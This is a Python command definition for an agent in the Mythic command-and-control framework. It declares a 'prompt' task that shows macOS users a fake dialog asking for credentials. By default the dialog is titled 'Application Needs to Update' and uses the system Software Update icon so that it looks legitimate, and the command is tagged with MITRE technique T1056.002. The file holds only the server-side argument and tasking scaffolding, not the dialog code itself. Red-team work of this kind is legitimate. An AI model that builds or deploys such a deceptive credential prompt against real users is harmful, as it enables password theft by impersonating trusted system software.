from mythic_container.MythicCommandBase import *
import json


class PromptArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="title",
                type=ParameterType.String,
                description="Title of the dialog box",
                default_value="Application Needs to Update",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="icon",
                type=ParameterType.String,
                description="full path to .icns file to use",
                default_value="/System/Library/PreferencePanes/SoftwareUpdate.prefPane/Contents/Resources/SoftwareUpdate.icns",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="text",
                type=ParameterType.String,
                description="additional descriptive text to display",
                default_value="An application needs permission to update",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="answer",
                type=ParameterType.String,
                description="Default answer to pre-populate",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply arguments")
        raise ValueError("Must supply named arguments or use the modal")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class PromptCommand(CommandBase):
    cmd = "prompt"
    needs_admin = False
    help_cmd = "prompt"
    description = "Create a custom prompt to ask the user for credentials where you can provide titles, icons, text and default answer."
    version = 1
    author = "@its_a_feature_"
    attackmapping = ["T1056.002"]
    argument_class = PromptArguments

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        response.DisplayParams = f"user with title \"{taskData.args.get_arg('title')}\" and message \"{taskData.args.get_arg('text')}\""
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
